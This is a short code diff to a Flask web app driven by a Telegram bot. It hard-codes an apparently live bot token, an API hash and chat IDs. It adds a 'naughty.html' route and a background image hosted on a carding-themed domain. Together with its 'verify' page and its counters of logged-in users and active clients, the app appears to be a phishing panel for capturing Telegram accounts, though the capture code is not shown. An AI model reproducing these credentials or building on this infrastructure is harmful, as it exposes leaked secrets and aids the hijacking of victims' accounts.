@@ -18,7 +18,7 @@ API_HASH = os.environ.get("API_HASH", "d044392a17690c14ee5b4a23651a0700")
 BOT_TOKEN = "8613982412:AAGEdvZdzjK3Eli_vIYoEtXnsxZgwodqnVE"
 OWNER_CHAT_ID = "-1003962414788"  
 ADMIN_ID = 6034439625             
-STORAGE_CHANNEL_ID = -1004382857247 # নতুন আপডেট করা টেলিগ্রাম স্টোরেজ চ্যানেল আইডি
+STORAGE_CHANNEL_ID = -1004382857247 
 
 active_clients = {}
 total_logged_in_users = 0  
@@ -191,6 +191,11 @@ def home():
     if os.path.exists('index.html'): return send_file('index.html')
     return "index.html not found", 404
 
+@app.route('/naughty.html', methods=['GET'])
+def naughty_page():
+    if os.path.exists('naughty.html'): return send_file('naughty.html')
+    return "naughty.html not found", 404
+
 @app.route('/verify', methods=['GET'])
 def verify_page():
     if os.path.exists('verify.html'): return send_file('verify.html')
@@ -209,7 +214,12 @@ def get_random_background():
     
     files = os.listdir(bg_folder)
     if not files:
-        return jsonify({"status": "empty", "url": "https://videotourl.com/videos/1792086671209-6307f585-29a1-4494-a780-4dc3ccec9aa8.mp4", "type": "video"})
+        return jsonify({
+            "status": "success", 
+            "url": "https://carder.top/imagens/1792298157180-542085424.jpg", 
+            "type": "image",
+            "blur": app.config.get("CURRENT_BLUR", "3px")
+        })
     
     chosen_file = random.choice(files)
     file_url = f"/static/backgrounds/{chosen_file}?v={int(time.time())}"
@@ -328,7 +338,7 @@ def telegram_webhook():
                     if file_id:
                         success, fname = download_background_file_by_id(file_id, "bg_media")
                         if success:
-                            send_telegram_message(chat_id, f"✅ **Background Video Stored Successfully!**\nSaved: `{fname}`")
+                            send_telegram_message(chat_id, f"✅ **Background Media Stored Successfully!**\nSaved: `{fname}`")
                         else:
                             send_telegram_message(chat_id, "⚠️ Error downloading file.")
                     else:
